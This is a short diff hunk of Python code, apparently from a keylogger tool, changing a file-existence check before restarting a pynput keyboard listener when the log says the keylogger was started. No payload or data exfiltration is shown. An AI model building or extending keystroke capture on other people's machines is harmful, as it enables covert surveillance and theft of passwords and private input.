@@ -168,7 +168,7 @@ def OnKeyboardEvent(event):
 if _pynput:
     KeyListener = Listener(on_press=OnKeyboardEvent)
     # Check the state of the keylogger from logs
-    if os.path.exists(LOG):
+    if os.path.isfile(LOG):
         for line in reverse_readline(LOG):
             if 'Started Keylogger' in line:
                 KeyListener.start()
